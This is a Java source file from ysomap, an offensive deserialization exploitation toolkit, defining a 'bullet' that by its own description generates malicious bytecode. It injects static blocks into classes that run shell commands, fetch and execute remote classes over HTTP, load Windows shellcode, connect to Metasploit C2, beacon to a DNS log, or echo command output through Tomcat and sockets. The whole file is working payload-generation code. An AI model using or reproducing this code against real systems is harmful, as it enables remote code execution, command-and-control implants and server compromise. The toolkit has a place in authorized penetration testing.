package ysomap.bullets.objects;

import echo.SocketEchoPayload;
import echo.TomcatEchoPayload;
import javassist.ClassPool;
import javassist.CtClass;
import loader.*;
import ysomap.bullets.AbstractBullet;
import ysomap.bullets.jdk.TemplatesImplBullet;
import ysomap.common.annotation.*;
import ysomap.common.util.Strings;
import ysomap.core.util.ClassFiles;
import ysomap.core.util.FileHelper;
import ysomap.core.util.PayloadHelper;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.zip.GZIPOutputStream;

/**
 * @author wh1t3p1g
 * @since 2022/11/17
 */
@Bullets
@Authors({Authors.WH1T3P1G})
@Details("用于生成恶意字节码，利用ysomap内的已有class生成字节码文件")
@Targets({Targets.CODE})
@Dependencies({"*"})
public class ClassWithExistEviClass extends AbstractBullet<byte[]> {

    @Require(name = "classname", detail = "所需生成的类名")
    public String classname;

    @NotNull
    @Require(name = "body", detail = "代码或命令，如果是代码以'code:'打头")
    public String body;

    @NotNull
    @Require(name = "type", detail = "所需生成的文件类型，支持class或jar")
    public String type = "class";

    @NotNull
    @Require(name = "effect", type = "string", detail="选择载入payload的效果，" +
            "可选default、SpecialRuntimeExecutor、SpecialCommandForWinExecutor、" +
            "TomcatEcho、SocketEcho、RemoteFileLoader、WinC2Loader、MSFJavaC2Loader、" +
            "RemoteFileHttpLoader、RemoteFileHttpExecutor、DnslogLoader、CustomizableClassLoader")
    private String effect = "default";

    @Require(name = "exception", type = "boolean", detail = "是否需要以抛异常的方式返回执行结果，默认为false")
    private String exception = "false";

    private Class superClass = null;

    private static Map<String, Object[]> effects;


    @Override
    public byte[] getObject() throws Exception {
        ClassPool pool = new ClassPool(true);
        CtClass cc = null;
        String code = null;
        Object[] objs = effects.get(effect);
        if(objs != null){
            Class<?> effectClazz = (Class) objs[0];
            if(classname == null){
                classname = effectClazz.getSimpleName() + System.currentTimeMillis();
            }
            code = process((String) objs[1], (String) objs[2], exception, body);
            cc = ClassFiles.makeClassFromExistClass(pool, effectClazz, null);
            cc.setName(classname);
        }

        if(cc != null){
            if(superClass != null){
                ClassFiles.insertSuperClass(pool, cc, superClass);
            }

            if(code != null){
                ClassFiles.insertStaticBlock(cc, code);
            }

            return ClassFiles.getClassBytecode(cc);
        }else{
            return new byte[0];
        }
    }


    public Object doAction(String action, String exception, Object data) throws IOException {
        if("split".equals(action) && data instanceof String){
            return ((String) data).split(";");
        }else if("read".equals(action) && data instanceof String){
            return FileHelper.fileGetContent((String) data);
        }else if("base64".equals(action) && data instanceof byte[]){
            return Strings.base64ToString((byte[]) data);
        }else if("gzip".equals(action) && data instanceof byte[]){
            ByteArrayOutputStream outBuf = new ByteArrayOutputStream();
            GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outBuf);
            gzipOutputStream.write((byte[]) data);
            gzipOutputStream.close();
            return outBuf.toByteArray();
        }else if("arrayToString".equals(action) && data instanceof byte[]){
            return Arrays.toString((byte[]) data)
                    .replace("[", "")
                    .replace("]", "");
        }else if("wrap".equals(action) && data instanceof String){
            if("false".equals(exception)){
                return PayloadHelper.makeRuntimeExecPayload((String) data);
            }else{
                return PayloadHelper.makeExceptionPayload((String) data);
            }
        }
        return data;
    }

    private String process(String formater, String action, String exception, String body) throws IOException {
        String code = null;
        if(formater != null){
            if(action == null){
                code = String.format(formater, body);
            }else{
                String[] actions = action.split(";");
                Object data = body;
                for(String act:actions){
                    data = doAction(act, exception, data);
                }
                if(data instanceof String){ // String
                    code = String.format(formater, data);
                }else{ // String[]
                    code = String.format(formater, Arrays.stream(((String[])data)).toArray());
                }
            }
        }
        return code;
    }

    static {
        effects = new HashMap<>();
        effects.put("default", new Object[]{TemplatesImplBullet.StubTransletPayload.class, "%s", "wrap"});
        effects.put("TomcatEcho", new Object[]{TomcatEchoPayload.class, null, null});
        effects.put("SocketEcho",
                new Object[]{SocketEchoPayload.class,
                        "host=\"%s\";port=%s;", "split"});
        effects.put("RemoteFileLoader",
                new Object[]{RemoteFileLoader.class,
                        "url=\"%s\";\nclassname=\"%s\";", "split"});
        effects.put("RemoteFileHttpLoader",
                new Object[]{RemoteFileHttpLoader.class,
                        "url=\"%s\";\nclassname=\"%s\";", "split"});
        effects.put("RemoteFileHttpExecutor",
                new Object[]{RemoteFileHttpExecutor.class,
                        "url=\"%s\";\nos=\"%s\";", "split"});
        effects.put("DnslogLoader",
                new Object[]{DnslogLoader.class, "dnslog=\"%s\";", null});
        effects.put("WinC2Loader",
                new Object[]{WinC2Loader.class,
                        "shellcode = new byte[]{%s};", "read;arrayToString"});
        effects.put("MSFJavaC2Loader",
                new Object[]{MSFJavaC2Loader.class,
                        "url=\"%s\";", null});
        effects.put("CustomizableClassLoader",
                new Object[]{CustomizableClassLoader.class,
                        "classBae64Str = \"%s\";", "read;gzip;base64"});

    }
}
